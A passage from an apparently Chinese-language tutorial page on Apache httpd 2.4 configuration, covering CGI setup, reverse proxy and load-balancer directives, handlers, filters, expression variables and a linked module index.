AuthBasicProvider file    AuthUserFile "/usr/local/apache/passwd/passwords"    AuthLDAPURL ldap://ldaphost/o=yourorg    AuthGroupFile "/usr/local/apache/passwd/groups"    Require group GroupName    Require ldap-group cn=mygroup,o=yourorg&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CGI与动态内容"><a href="#CGI与动态内容" class="headerlink" title="CGI与动态内容"></a>CGI与动态内容</h3><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>AddHandler cgi-script .cgi</code></td><td>将文件扩展名映射到指定的处理程序（指定拓展名.cgi为CGI文件）</td></tr><tr><td><code>Options ExecCGI</code></td><td></td></tr><tr><td>`ScriptAlias [URL-path] file-path</td><td>directory-path`</td></tr><tr><td><code>LoadModule cgi_module modules/mod_cgi.so</code></td><td>配置 Apache 以允许 CGI 执行</td></tr><tr><td>`SetHandler handler-name</td><td>none</td></tr><tr><td>…</td><td></td></tr></tbody></table><p>要允许CGI程序执行用户目录中结束的任何文件。<code>.cgi</code></p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/home/*/public_html"&gt;    Options +ExecCGI    AddHandler cgi-script .cgi&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果您希望指定用户目录的子目录，其中所有内容都将被视为 CGI 程序。cgi-bin`</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/home/*/public_html/cgi-bin"&gt;    Options ExecCGI    SetHandler cgi-script&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="编写CGI"><a href="#编写CGI" class="headerlink" title="编写CGI"></a>编写CGI</h4><p>保存到名为<code>first.pl</code>的文件中，并将其放在<code>cgi-bin</code>目录中</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/perlprint "Content-type: text/html\n\n";print "Hello, World.";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>浏览器输入URL地址</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">http://www.example.com/cgi-bin/first.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><h4 id="简单的反向代理"><a href="#简单的反向代理" class="headerlink" title="简单的反向代理"></a>简单的反向代理</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">ProxyPass "/images"  "http://www.example.com/"ProxyPassReverse "/images"  "http://www.example.com/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>任何以<code>/images</code>路径开头的请求都被代理到指定的后端，否则它将在本地处理</p><h4 id="集群和均衡器"><a href="#集群和均衡器" class="headerlink" title="集群和均衡器"></a>集群和均衡器</h4><p>负载均衡和故障转移</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy balancer://myset&gt;    BalancerMember http://www2.example.com:8080    BalancerMember http://www3.example.com:8080    ProxySet lbmethod=bytraffic&amp;lt/Proxy&gt;ProxyPass "/images/"  "balancer://myset/"ProxyPassReverse "/images/"  "balancer://myset/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="均衡器和均衡器成员配置"><a href="#均衡器和均衡器成员配置" class="headerlink" title="均衡器和均衡器成员配置"></a>均衡器和均衡器成员配置</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy balancer://myset&gt;    BalancerMember http://www2.example.com:8080    BalancerMember http://www3.example.com:8080 loadfactor=3 timeout=1    ProxySet lbmethod=bytraffic&amp;lt/Proxy&gt;ProxyPass "/images"  "balancer://myset/"ProxyPassReverse "/images"  "balancer://myset/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="故障转移"><a href="#故障转移" class="headerlink" title="故障转移"></a>故障转移</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy balancer://myset&gt;    BalancerMember http://www2.example.com:8080    BalancerMember http://www3.example.com:8080 loadfactor=3 timeout=1    BalancerMember http://spare1.example.com:8080 status=+R    BalancerMember http://spare2.example.com:8080 status=+R    BalancerMember http://hstandby.example.com:8080 status=+H    BalancerMember http://bkup1.example.com:8080 lbset=1    BalancerMember http://bkup2.example.com:8080 lbset=1    ProxySet lbmethod=byrequests&amp;lt/Proxy&gt;ProxyPass "/images/"  "balancer://myset/"ProxyPassReverse "/images/"  "balancer://myset/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="均衡器启用"><a href="#均衡器启用" class="headerlink" title="均衡器启用"></a>均衡器启用</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltLocation "/balancer-manager"&gt;    SetHandler balancer-manager    Require host localhost&amp;lt/Location&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性值</th><th>意义</th></tr></thead><tbody><tr><td>`ProxyPass [path] !</td><td>url [key=value [key=value …]] [nocanon] [interpolate] [noquery]`</td></tr><tr><td><code>BalancerMember [balancerurl] url [key=value [key=value ...]]</code></td><td>向负载均衡组添加成员</td></tr><tr><td><code>ProxyPassReverse [path] url [interpolate]</code></td><td>调整从反向代理服务器发送的 HTTP 响应标头中的 URL</td></tr><tr><td><code>BalancerMember [balancerurl] url [key=value [key=value ...]]</code></td><td>向负载均衡组添加成员</td></tr><tr><td><code>ProxySet url key=value [key=value ...]</code></td><td>设置各种代理平衡器或成员参数</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><p>和<code>httpd.conf</code>的语法一样，作用于当前目录，一般用来设置单个功能</p><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>Action action-type cgi-script [virtual]</code></td><td>为特定处理程序或内容类型激活 CGI 脚本</td></tr><tr><td><code>AddHandler handler-name extension [extension] ...</code></td><td>将文件扩展名映射到指定的处理程序</td></tr><tr><td><code>RemoveHandler extension [extension] ...</code></td><td>删除一组文件扩展名的任何处理程序关联</td></tr><tr><td><code>SetHandler handler-name</code></td><td>none</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><table><thead><tr><th>属性值</th><th>意义</th></tr></thead><tbody><tr><td><code>FilterChain [+=-@!]filter-name ...</code></td><td>配置过滤器链</td></tr><tr><td><code>FilterDeclare filter-name [type]</code></td><td>声明一个智能过滤器</td></tr><tr><td><code>FilterProtocol filter-name [provider-name] proto-flags</code></td><td>声明一个智能过滤器</td></tr><tr><td><code>FilterProvider filter-name provider-name expression</code></td><td>注册内容过滤器</td></tr><tr><td><code>AddInputFilter filter[;filter...] extension [extension] ...</code></td><td>将文件扩展名映射到将处理客户端请求的过滤器</td></tr><tr><td><code>AddOutputFilter filter[;filter...] extension [extension] ...</code></td><td>将文件扩展名映射到将处理来自服务器的响应的过滤器</td></tr><tr><td><code>RemoveInputFilter extension [extension] ...</code></td><td>删除一组文件扩展名的任何输入过滤器关联</td></tr><tr><td><code>RemoveOutputFilter extension [extension] ...</code></td><td>删除一组文件扩展名的任何输出过滤器关联</td></tr><tr><td><code>ReflectorHeader inputheader [outputheader]</code></td><td>将输入标题反映到输出标题</td></tr><tr><td><code>ExtFilterDefine filtername parameters</code></td><td>定义外部过滤器</td></tr><tr><td><code>ExtFilterOptions option [option] ...</code></td><td>配置 <code>mod_ext_filter </code>选项</td></tr><tr><td><code>SetInputFilter filter[;filter...]</code></td><td>设置将处理客户端请求和 POST 输入的过滤器</td></tr><tr><td><code>SetOutputFilter filter[;filter...]</code></td><td>设置将处理来自服务器的响应的过滤器</td></tr><tr><td>…</td><td></td></tr></tbody></table><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><table><thead><tr><th>HTTP变量</th></tr></thead><tbody><tr><td><code>HTTP_ACCEPT</code></td></tr><tr><td><code>HTTP_COOKIE</code></td></tr><tr><td><code>HTTP_FORWARDED</code></td></tr><tr><td><code>HTTP_HOST</code></td></tr><tr><td><code>HTTP_PROXY_CONNECTION</code></td></tr><tr><td><code>HTTP_REFERER</code></td></tr><tr><td><code>HTTP_USER_AGENT</code></td></tr></tbody></table><table><thead><tr><th>名字</th><th>描述</th></tr></thead><tbody><tr><td><code>REQUEST_METHOD</code></td><td>传入请求的 HTTP 方法（例如<code>GET</code>)</td></tr><tr><td><code>REQUEST_SCHEME</code></td><td>该计划是请求URI的一部分</td></tr><tr><td><code>REQUEST_URI</code></td><td>请求URI的路径部分</td></tr><tr><td><code>DOCUMENT_URI</code></td><td>和<code>REQUEST_URI</code>一样</td></tr><tr><td><code>REQUEST_FILENAME</code></td><td>如果当时服务器已经确定了该路径，与请求匹配的文件或脚本的完整本地文件系统路径。否则，例如在虚拟主机上下文中使用时，与 <code>REQUEST_FILENAME REQUEST_URI </code>相同的值</td></tr><tr><td><code>SCRIPT_FILENAME</code></td><td>和<code>REQUEST_FILENAME</code>一样</td></tr><tr><td><code>LAST_MODIFIED</code></td><td>如果此时服务器已经确定该格式中文件上次修改的日期和时间，则参照该日期和时间进行引用。<code>20101231235959</code> <code>LAST_MODIFIED</code></td></tr><tr><td><code>SCRIPT_USER</code></td><td>脚本所有者的用户名。</td></tr><tr><td><code>SCRIPT_GROUP</code></td><td>脚本组的组名。</td></tr><tr><td><code>PATH_INFO</code></td><td>尾随路径名称信息，请参阅<code>AcceptPathInfo</code></td></tr><tr><td><code>QUERY_STRING</code></td><td>当前请求的查询字符串</td></tr><tr><td><code>IS_SUBREQ</code></td><td>如果当前请求是次要请求<code>true</code>，否则<code>false</code></td></tr><tr><td><code>THE_REQUEST</code></td><td>完整的请求行（例如”<code>GET /index.html HTTP/1.1</code>“)</td></tr><tr><td><code>REMOTE_ADDR</code></td><td>远程主机的 IP 地址</td></tr><tr><td><code>REMOTE_PORT</code></td><td>远程主机的端口（2.4.26 及以后）</td></tr><tr><td><code>REMOTE_HOST</code></td><td>远程主机的主机名称</td></tr><tr><td><code>REMOTE_USER</code></td><td>已验证用户的名称（在<code>&amp;ltIF&gt;</code>不可用）</td></tr><tr><td><code>REMOTE_IDENT</code></td><td><code>mod_ident</code> 设置的用户名</td></tr><tr><td><code>SERVER_NAME</code></td><td>当前的虚拟<code>ServerName</code></td></tr><tr><td><code>SERVER_PORT</code></td><td>当前vhost的服务器端口，请参阅<code>ServerName</code></td></tr><tr><td><code>SERVER_ADMIN</code></td><td>当前的虚拟<code>ServerAdmin</code></td></tr><tr><td><code>SERVER_PROTOCOL</code></td><td>请求所使用的协议</td></tr><tr><td><code>DOCUMENT_ROOT</code></td><td>当前的虚拟<code>DocumentRoot</code></td></tr><tr><td><code>AUTH_TYPE</code></td><td>配置（例如<code>AuthType basic</code>)</td></tr><tr><td><code>CONTENT_TYPE</code></td><td>响应的内容类型（在 <code>&amp;ltIf&gt;</code> 间不可用）</td></tr><tr><td><code>HANDLER</code></td><td>创建响应的<a href="http://httpd.apache.org/docs/2.4/handler.html">处理程序</a>的名称</td></tr><tr><td><code>HTTP2</code></td><td>如果请求使用http/2<code>on</code>，否则<code>off</code></td></tr><tr><td><code>HTTPS</code></td><td>如果请求使用https<code>on</code>，否则<code>off</code></td></tr><tr><td><code>IPV6</code></td><td>如果连接使用IPv6<code>on</code>，否则<code>off</code></td></tr><tr><td><code>REQUEST_STATUS</code></td><td>请求的 HTTP 错误状态（在<code>&amp;ltIf&gt;</code>间不可用）)</td></tr><tr><td><code>REQUEST_LOG_ID</code></td><td>请求的错误日志ID（参见<code>ErrorLogFormat</code>)</td></tr><tr><td><code>CONN_LOG_ID</code></td><td>连接的错误日志ID（参见<code>ErrorLogFormat</code>)</td></tr><tr><td><code>CONN_REMOTE_ADDR</code></td><td>连接的同侪 IP 地址（参见模块）<code>mod_remoteip</code></td></tr><tr><td><code>CONTEXT_PREFIX</code></td><td></td></tr><tr><td><code>CONTEXT_DOCUMENT_ROOT</code></td><td></td></tr></tbody></table><table><thead><tr><th>名字</th><th>描述</th></tr></thead><tbody><tr><td><code>TIME_YEAR</code></td><td>本年度（例如<code>2010</code>)</td></tr><tr><td><code>TIME_MON</code></td><td>当月（，…，<code>0112</code>)</td></tr><tr><td><code>TIME_DAY</code></td><td>本月的当前日期（，…）<code>01</code></td></tr><tr><td><code>TIME_HOUR</code></td><td>当前时间的小时部分（，…，<code>0023</code>)</td></tr><tr><td><code>TIME_MIN</code></td><td>当前时间的分钟部分</td></tr><tr><td><code>TIME_SEC</code></td><td>当前时间的秒钟部分</td></tr><tr><td><code>TIME_WDAY</code></td><td>一周的一天（从周日开始）<code>0</code></td></tr><tr><td><code>TIME</code></td><td>格式中的日期和时间<code>20101231235959</code></td></tr><tr><td><code>SERVER_SOFTWARE</code></td><td>服务器版本字符串</td></tr><tr><td><code>API_VERSION</code></td><td>API 版本的日期（模块魔法数字）</td></tr></tbody></table><h4 id="二进制变量"><a href="#二进制变量" class="headerlink" title="二进制变量"></a>二进制变量</h4><table><thead><tr><th align="left">名字</th><th align="left">其他形式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>==</code></td><td align="left"><code>=</code></td><td align="left">字符串均等</td></tr><tr><td align="left"><code>!=</code></td><td align="left"></td><td align="left">字符串不平等</td></tr><tr><td align="left"><code>&amp;lt</code></td><td align="left"></td><td align="left">字符串少于</td></tr><tr><td align="left"><code>&amp;lt=</code></td><td align="left"></td><td align="left">字符串小于或等于</td></tr><tr><td align="left"><code>&gt;</code></td><td align="left"></td><td align="left">字符串大于</td></tr><tr><td align="left"><code>&gt;=</code></td><td align="left"></td><td align="left">字符串大于或等于</td></tr><tr><td align="left"><code>=~</code></td><td align="left"></td><td align="left">字符串与常规表达方式匹配</td></tr><tr><td align="left"><code>!~</code></td><td align="left"></td><td align="left">字符串与常规表达不匹配</td></tr><tr><td align="left"><code>-eq</code></td><td align="left"><code>eq</code></td><td align="left">整数平等</td></tr><tr><td align="left"><code>-ne</code></td><td align="left"><code>ne</code></td><td align="left">整数不平等</td></tr><tr><td align="left"><code>-lt</code></td><td align="left"><code>lt</code></td><td align="left">整数小于</td></tr><tr><td align="left"><code>-le</code></td><td align="left"><code>le</code></td><td align="left">整数小于或相等</td></tr><tr><td align="left"><code>-gt</code></td><td align="left"><code>gt</code></td><td align="left">整数大于</td></tr><tr><td align="left"><code>-ge</code></td><td align="left"><code>ge</code></td><td align="left">整数大于或相等</td></tr></tbody></table><h4 id="统一变量"><a href="#统一变量" class="headerlink" title="统一变量"></a>统一变量</h4><table><thead><tr><th align="left">名字</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-d</code></td><td align="left">参数被视为文件名。如果文件存在并且是目录，则为真</td></tr><tr><td align="left"><code>-e</code></td><td align="left">参数被视为文件名。如果存在文件（或目录和特殊文件），则为真</td></tr><tr><td align="left"><code>-f</code></td><td align="left">参数被视为文件名。如果文件存在并且是常规文件，则为真</td></tr><tr><td align="left"><code>-s</code></td><td align="left">参数被视为文件名。如果文件存在且不是空的，则正确</td></tr><tr><td align="left"><code>-L</code></td><td align="left">参数被视为文件名。如果文件存在并且是符号链接，则为真</td></tr><tr><td align="left"><code>-h</code></td><td align="left">参数被视为文件名。真实的，如果文件存在，是符号链接（与<code>-L</code>相似)</td></tr><tr><td align="left"><code>-F</code></td><td align="left">如果字符串是一个有效的文件，则可以通过该路径的所有服务器当前配置的访问控制进行访问。</td></tr><tr><td align="left"><code>-U</code></td><td align="left">如果字符串是一个有效的URL，则可以通过该路径的所有服务器当前配置的访问控制进行访问。</td></tr><tr><td align="left"><code>-A</code></td><td align="left">别名<code>-U</code></td></tr><tr><td align="left"><code>-n</code></td><td align="left">如果字符串不是空的，则为真</td></tr><tr><td align="left"><code>-z</code></td><td align="left">如果字符串是空的，则为真</td></tr><tr><td align="left"><code>-T</code></td><td align="left">如果字符串为空,””,””,”” 或 “”（不区分大小写），则为 False，否则为真</td></tr><tr><td align="left"><code>-R</code></td><td align="left">与<code>%{REMOTE_ADDR} -ipmatch ...</code>相同，但效率更高</td></tr></tbody></table><h4 id="功能变量"><a href="#功能变量" class="headerlink" title="功能变量"></a>功能变量</h4><table><thead><tr><th align="left">名字</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>req</code>,<code>http</code></td><td align="left">获取 HTTP 请求标题；标头名称可以添加到 Vary 标头</td></tr><tr><td align="left"><code>req_novary</code></td><td align="left">与 相同，但不会将标头名称添加到 Vary 标头中</td></tr><tr><td align="left"><code>resp</code></td><td align="left">获取 HTTP 响应头（大多数响应标题在<code>&amp;ltIf&gt;</code>间尚未设置）</td></tr><tr><td align="left"><code>reqenv</code></td><td align="left">查找请求环境变量（作为快捷方式，也可用于访问变量）</td></tr><tr><td align="left"><code>osenv</code></td><td align="left">查找操作系统环境变量</td></tr><tr><td align="left"><code>note</code></td><td align="left">查找请求说明</td></tr><tr><td align="left"><code>env</code></td><td align="left">返回第一个匹配</td></tr><tr><td align="left"><code>tolower</code></td><td align="left">将字符串转换为小写</td></tr><tr><td align="left"><code>toupper</code></td><td align="left">将字符串转换为大写</td></tr><tr><td align="left"><code>escape</code></td><td align="left">在 %hex 编码中转义特殊字符</td></tr><tr><td align="left"><code>unescape</code></td><td align="left">Unescape %hex 编码的字符串，单独留下编码的斜杠；如果找到 %00，则返回空字符串</td></tr><tr><td align="left"><code>base64</code></td><td align="left">使用 base64 编码对字符串进行编码</td></tr><tr><td align="left"><code>unbase64</code></td><td align="left">解码base64编码的字符串，如果找到0x00则返回截断的字符串</td></tr><tr><td align="left"><code>md5</code></td><td align="left">使用 MD5 对字符串进行散列，然后使用十六进制编码对散列进行编码</td></tr><tr><td align="left"><code>sha1</code></td><td align="left">使用 SHA1 对字符串进行散列，然后使用十六进制编码对散列进行编码</td></tr><tr><td align="left"><code>file</code></td><td align="left">从文件中读取内容（包括行尾，如果存在）</td></tr><tr><td align="left"><code>filemod</code></td><td align="left">返回文件的最后修改时间（如果文件不存在或不是常规文件，则返回 0）</td></tr><tr><td align="left"><code>filesize</code></td><td align="left">返回文件的大小（如果文件不存在或不是常规文件，则返回 0）</td></tr></tbody></table><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p><a href="http://httpd.apache.org/docs/2.4/mod/">模块索引 - Apache HTTP 服务器 版本 2.4</a></p><h4 id="核心与多处理模块-MPM"><a href="#核心与多处理模块-MPM" class="headerlink" title="核心与多处理模块(MPM)"></a>核心与多处理模块(MPM)</h4><p><a href="http://httpd.apache.org/docs/2.4/mod/core.html">core</a></p><p>始终可用的核心 Apache HTTP Server 功能</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpm_common.html">mpm_common</a></p><p>由多个多处理模块 (MPM) 实现的一组指令</p><p><a href="http://httpd.apache.org/docs/2.4/mod/event.html">event</a></p><p>MPM 的一种变体，其目标是仅为与活动处理工作者的连接消耗线程</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpm_netware.html">mpm_netware</a></p><p>实现专为 Novell NetWare 优化的线程 Web 服务器的多处理模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpmt_os2.html">mpmt_os2</a></p><p>用于 OS/2 的混合多进程、多线程 MPM</p><p><a href="http://httpd.apache.org/docs/2.4/mod/prefork.html">prefork</a></p><p>实现一个非线程的、预分叉的 Web 服务器</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mpm_winnt.html">mpm_winnt</a></p><p>为 Windows NT 优化的多处理模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/worker.html">worker</a></p><p>实现混合多线程多进程 Web 服务器的多处理模块</p><h4 id="其他模块"><a href="#其他模块" class="headerlink" title="其他模块"></a>其他模块</h4><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_access_compat.html">mod_access_compat</a></p><p>基于主机（名称或 IP 地址）的组授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_actions.html">mod_actions</a></p><p>根据媒体类型或请求方法执行 CGI 脚本</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_alias.html">mod_alias</a></p><p>提供在文档树中映射主机文件系统的不同部分和 URL 重定向</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_allowmethods.html">mod_allowmethods</a></p><p>轻松限制可以在服务器上使用的 HTTP 方法</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_asis.html">mod_asis</a></p><p>发送包含自己的 HTTP 标头的文件</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_auth_basic.html">mod_auth_basic</a></p><p>基本 HTTP 身份验证</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_auth_digest.html">mod_auth_digest</a></p><p>使用 MD5 摘要身份验证的用户身份验证</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_auth_form.html">mod_auth_form</a></p><p>表单认证</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_anon.html">mod_authn_anon</a></p><p>允许“匿名”用户访问经过身份验证的区域</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_core.html">mod_authn_core</a></p><p>核心身份验证</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_dbd.html">mod_authn_dbd</a></p><p>使用 SQL 数据库进行用户身份验证</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_dbm.html">mod_authn_dbm</a></p><p>使用 DBM 文件进行用户身份验证</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_file.html">mod_authn_file</a></p><p>使用文本文件进行用户身份验证</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_socache.html">mod_authn_socache</a></p><p>管理身份验证凭据缓存以减轻后端的负载</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authnz_fcgi.html">mod_authnz_fcgi</a></p><p>允许 FastCGI 授权器应用程序处理 Apache httpd 身份验证和授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authnz_ldap.html">mod_authnz_ldap</a></p><p>允许使用 LDAP 目录来存储用于 HTTP 基本身份验证的数据库</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_core.html">mod_authz_core</a></p><p>核心授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_dbd.html">mod_authz_dbd</a></p><p>使用 SQL 进行组授权和登录</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_dbm.html">mod_authz_dbm</a></p><p>使用 DBM 文件的组授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_groupfile.html">mod_authz_groupfile</a></p><p>使用纯文本文件的组授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_host.html">mod_authz_host</a></p><p>基于主机（名称或 IP 地址）的组授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_owner.html">mod_authz_owner</a></p><p>基于文件所有权的授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_user.html">mod_authz_user</a></p><p>用户授权</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_autoindex.html">mod_autoindex</a></p><p>自动生成目录索引，类似于 Unix 命令或 Win32 shell commandlsdir</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_brotli.html">mod_brotli</a></p><p>在将内容交付给客户端之前通过 Brotli 压缩内容</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_buffer.html">mod_buffer</a></p><p>支持请求缓冲</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cache.html">mod_cache</a></p><p>符合 RFC 2616 的 HTTP 缓存过滤器</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cache_disk.html">mod_cache_disk</a></p><p>用于 HTTP 缓存过滤器的基于磁盘的存储模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cache_socache.html">mod_cache_socache</a></p><p>基于共享对象缓存 (socache) 的存储模块，用于 HTTP 缓存过滤器</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cern_meta.html">mod_cern_meta</a></p><p>CERN httpd 元文件语义</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cgi.html">mod_cgi</a></p><p>CGI脚本的执行</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cgid.html">mod_cgid</a></p><p>使用外部 CGI 守护程序执行 CGI 脚本</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_charset_lite.html">mod_charset_lite</a></p><p>指定字符集转换或重新编码</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_data.html">mod_data</a></p><p>将响应正文转换为 RFC2397 数据 URL</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dav.html">mod_dav</a></p><p>分布式创作和版本控制<a href="http://www.webdav.org/">WebDAV</a> 功能</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dav_fs.html">mod_dav_fs</a></p><p><code>mod_dav</code> 的文件系统提供程序</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dav_lock.html">mod_dav_lock</a></p><p><code>mod_dav</code> 的通用锁定模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dbd.html">mod_dbd</a></p><p>管理 SQL 数据库连接</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_deflate.html">mod_deflate</a></p><p>在将内容交付给客户端之前对其进行压缩</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dialup.html">mod_dialup</a></p><p>以各种旧调制解调器标准定义的带宽速率限制发送静态内容</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dir.html">mod_dir</a></p><p>提供”跟踪斜线”重定向和服务目录索引文件</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dumpio.html">mod_dumpio</a></p><p>根据需要将所有 I/O 转储到错误日志</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_echo.html">mod_echo</a></p><p>一个简单的回显服务器来说明协议模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_env.html">mod_env</a></p><p>修改传递给 CGI 脚本和 SSI 页面的环境</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_example_hooks.html">mod_example_hooks</a></p><p>说明 Apache 模块 API</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_expires.html">mod_expires</a></p><p>根据用户指定的标准生成和 HTTP 标头<code>ExpiresCache-Control</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ext_filter.html">mod_ext_filter</a></p><p>在传递给客户端之前通过外部程序传递响应正文</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_file_cache.html">mod_file_cache</a></p><p>在内存中缓存静态文件列表</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_filter.html">mod_filter</a></p><p>上下文敏感的智能过滤器配置模块</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_headers.html">mod_headers</a></p><p>HTTP 请求和响应标题的自定义</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_heartbeat.html">mod_heartbeat</a></p><p>将带有服务器状态的消息发送到前端代理</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_heartmonitor.html">mod_heartmonitor</a></p><p>mod_heartbeat源服务器的集中监视器</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_http2.html">mod_http2</a></p><p>支持 HTTP/2 运输层</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ident.html">mod_ident</a></p><p>RFC 1413 标识查找</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_imagemap.html">mod_imagemap</a></p><p>服务器侧图像映像处理</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_include.html">mod_include</a></p><p>服务器解析 html 文档（服务器侧包含）</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_info.html">mod_info</a></p><p>提供服务器配置的全面概述</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_isapi.html">mod_isapi</a></p><p>Apache for Windows 中的 ISAPI 扩展</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_bybusyness.html">mod_lbmethod_bybusyness</a></p><p>待定请求计数负载平衡器调度器算法<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_byrequests.html">mod_lbmethod_byrequests</a></p><p>请求计算负载平衡器调度器算法<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_bytraffic.html">mod_lbmethod_bytraffic</a></p><p>加权流量计数负载平衡器调度器算法<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_heartbeat.html">mod_lbmethod_heartbeat</a></p><p>心跳流量计数负载平衡器调度器算法<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ldap.html">mod_ldap</a></p><p>供其他 LDAP 模块使用的 LDAP 连接池和结果缓存服务</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_log_config.html">mod_log_config</a></p><p>记录向服务器提出的请求</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_log_debug.html">mod_log_debug</a></p><p>额外的可配置调试日志记录</p><p><a 